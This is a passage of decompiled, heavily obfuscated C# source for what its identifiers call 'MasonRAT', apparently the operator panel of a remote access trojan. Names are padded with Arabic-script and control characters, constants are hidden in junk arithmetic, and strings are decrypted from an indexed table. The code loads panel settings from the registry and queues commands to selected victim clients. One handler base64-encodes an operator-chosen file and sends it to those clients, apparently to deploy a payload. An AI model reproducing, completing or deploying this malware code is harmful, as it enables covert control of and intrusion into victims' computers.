    this.\u2694️MasonRAT\u270Cط\u060Aٽــمڕـڙــ\u060Dٽـط\u0609ــۜ\u060D.Text = !Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1473), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1474), (object) null), (object) null, false) ? Conversions.ToString(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1476), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1477), (object) null)) : \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1475);
    if (Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1478), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1479), (object) null), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1480), false))
    {
      this.\u2694️MasonRAT\u270C\u060Aـ\u060Dـءټ\u060Aــ\u0609؁ـ\u060A\u060Fـ̍ټ\u060E.Enabled = false;
      this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Enabled = false;
      this.\u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ.Enabled = false;
      this.\u2694️MasonRAT\u270Cٽ\u060Aژ\u060Aڝٺ\u060A\u0608ۙـ\u060Aۏٸــۧ\u0609\u0609.Checked = true;
      this.\u2694️MasonRAT\u270Cط\u060Aٽــمڕـڙــ\u060Dٽـط\u0609ــۜ\u060D.Enabled = true;
    }
    else
    {
      this.\u2694️MasonRAT\u270C\u060Aـ\u060Dـءټ\u060Aــ\u0609؁ـ\u060A\u060Fـ̍ټ\u060E.Enabled = true;
      this.\u2694️MasonRAT\u270C\u060D\u060Cۧٸء\u060Dـ\u060Eٺـڙ\u060B.Enabled = true;
      this.\u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ.Enabled = true;
      this.\u2694️MasonRAT\u270Cٽ\u060Aژ\u060Aڝٺ\u060A\u0608ۙـ\u060Aۏٸــۧ\u0609\u0609.Checked = false;
      this.\u2694️MasonRAT\u270Cط\u060Aٽــمڕـڙــ\u060Dٽـط\u0609ــۜ\u060D.Enabled = false;
    }
    this.\u2694️MasonRAT\u270C̍ﯧـڙ\u0609ڕڙ\u060Dـ\u060Dـ\u060Cــﯧ\u060B\u0609.Text = !Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1481), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1482), (object) null), (object) null, false) ? Conversions.ToString(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1484), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1485), (object) null)) : \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1483);
    if (Operators.ConditionalCompareObjectEqual(MyProject.\u2694️MasonRAT\u270Cحڙاـ\u060Dﻼڙۜﻋــء̨\u0608ـۨـٻــ.Registry.GetValue(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1486), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1487), (object) null), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1488), false))
    {
      this.\u2694️MasonRAT\u270Cٽـڅـڦ\u0609ﯧد\u060F\u060Bــۙـٺ\u060Bاـ.Checked = true;
      this.\u2694️MasonRAT\u270C̍ﯧـڙ\u0609ڕڙ\u060Dـ\u060Dـ\u060Cــﯧ\u060B\u0609.Enabled = true;
    }
    else
    {
      this.\u2694️MasonRAT\u270Cٽـڅـڦ\u0609ﯧد\u060F\u060Bــۙـٺ\u060Bاـ.Checked = false;
      this.\u2694️MasonRAT\u270C̍ﯧـڙ\u0609ڕڙ\u060Dـ\u060Dـ\u060Cــﯧ\u060B\u0609.Enabled = false;
    }
  }

  private void \u2694️MasonRAT\u270C̍ڙؤڙۡــٺ\u0609ﻼ\u0609ٺڼـمﻻـ(
    object sender,
    DrawListViewColumnHeaderEventArgs e)
  {
    SolidBrush solidBrush = new SolidBrush(Color.FromArgb((~1914892844 - 1732775330 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + (375626358 + (2112541244 >> 1834483377) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 << ((917583287 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0, (-1119135681 - -1119135730 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((1287995002 ^ 1134755547 << 1054401455) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 << ((619757684 > 715360795 ? 1295287977 : 971465983) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), ((663910926 > 1124241801 ? 108 : 81) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + (-1735171787 - 775092009 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 >> 501548922 + 652028581 % 1746263342 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)));
    Color white = Color.White;
    e.DrawBackground();
    e.Graphics.FillRectangle((Brush) solidBrush, e.Bounds);
    TextRenderer.DrawText((IDeviceContext) e.Graphics, e.Header.Text, e.Font, e.Bounds, white);
  }

  private void \u2694️MasonRAT\u270C\u0608\u060Dﮪ\u060Bــا\u060Aٺۭــــ\u060Dٺــ(
    object sender,
    DrawListViewColumnHeaderEventArgs e)
  {
    SolidBrush solidBrush = new SolidBrush(Color.FromArgb(-370753120 - -329420346 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + (535649979 % 1314383853 - 494317156 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0), ((-323201307 ^ 18) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((229608629 > 140645919 ? 1914291995 : -1742577970) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) % ((1591090674 ^ 19) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0, -1957063525 - (350805513 << 1844236529) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + (723553837 - ~93838728 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1));
    Color white = Color.White;
    e.DrawBackground();
    e.Graphics.FillRectangle((Brush) solidBrush, e.Bounds);
    TextRenderer.DrawText((IDeviceContext) e.Graphics, e.Header.Text, e.Font, e.Bounds, white);
  }

  private void \u2694️MasonRAT\u270Cﻋڝ\u060A\u0608\u0608ﻼۚ\u060Aــڙڠﻼ\u060Bـ\u0608ﮪڝ(
    object sender,
    DrawListViewItemEventArgs e)
  {
    e.DrawDefault = true;
  }

  private void \u2694️MasonRAT\u270Cـڕٸدڙـــ\u0609طؤ\u0608\u0608\u060E\u060E(
    object sender,
    DrawListViewSubItemEventArgs e)
  {
    e.DrawDefault = true;
  }

  private void \u2694️MasonRAT\u270Cۚ\u0608ڙـڜـڠـۚڼ\u060F\u060Aط\u0608ٸٻ\u060D(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1489));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609\u060Bﯧۧـ\u060Dؤ\u060Aۙـــ\u060Dـــ\u060Aڙـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    OpenFileDialog openFileDialog = new OpenFileDialog();
    if (openFileDialog.ShowDialog() == DialogResult.OK)
    {
      try
      {
        string[] strArray = new string[(1095516083 - 2013151148 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ (363488416 ^ 7) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 << (237091358 > 14001864 ? 1105063569 : 1473418092) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)];
        strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1490);
        strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[((1995299372 >> 1120785907) - 140833321 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ ~(676306504 - (247608045 | 334149695) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1491)));
        strArray[((1219957765 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + ((509084910 + (352558984 >> 538030624) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) << (1837182342 + (1721970514 >> 161124061) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[((1520109581 ^ ~2095266038) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ 235368786 + 1339168381 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << 310752174 + 571516986 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName));
        strArray[(1173476194 | 1066655531) - 905680984 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - (1529608067 - 288600181 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
        strArray[(1288916123 - 1688318743 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ ~((1977317312 > 473962380 ? 399402621 : 532536828) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1] = Path.GetExtension(openFileDialog.FileName);
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270C\u0608\u060Eــٽڼْـئـ̨ۡۙٸح\u060C\u0608ٺـﻻ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cٻﻋ\u060A̍ټ̍\u0609ــ\u060C\u060Dــح\u0608ּـ(
    object sender,
    EventArgs e)
  {
    try
    {
      ToolStripStatusLabel stripStatusLabel = this.\u2694️MasonRAT\u270Cـ\u060Aٻـــ\u060D\u060B\u0608\u060A\u0608ٸ;
      string[] strArray1 = new string[(-1520253612 - 1498337862 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 > (5799758 > 1770895240 ? 596928661 : 447696496) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ? (0 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 : 1576188118 - (225589450 | 1367384204) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0];
      string format = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1492);
